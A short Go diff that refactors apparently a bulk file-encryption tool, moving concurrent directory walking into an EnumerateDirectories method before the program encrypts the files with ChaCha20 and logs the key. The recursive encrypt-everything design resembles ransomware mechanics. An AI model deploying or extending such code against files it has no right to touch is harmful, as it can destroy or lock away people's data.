@@ -4,9 +4,7 @@ import (
 	"flag"
 	"log"
 	"os"
-	"path/filepath"
 	"strings"
-	"sync"
 )
 
 func main() {
@@ -31,19 +29,7 @@ func main() {
 		WorkerCount:    workerCount,
 	}
 
-	var wg sync.WaitGroup
-	for _, d := range dirs {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			encryptor.ErrChan <- filepath.WalkDir(d, encryptor.Enumerate)
-		}()
-	}
-
-	go func() {
-		wg.Wait()
-		encryptor.Done <- struct{}{}
-	}()
+	encryptor.EnumerateDirectories(dirs)
 
 	log.Printf("encrypting files with chacha20 stream cipher\nkey: %s\n", encryptor.Key)
 	log.Fatal(encryptor.ListenAndEncrypt())
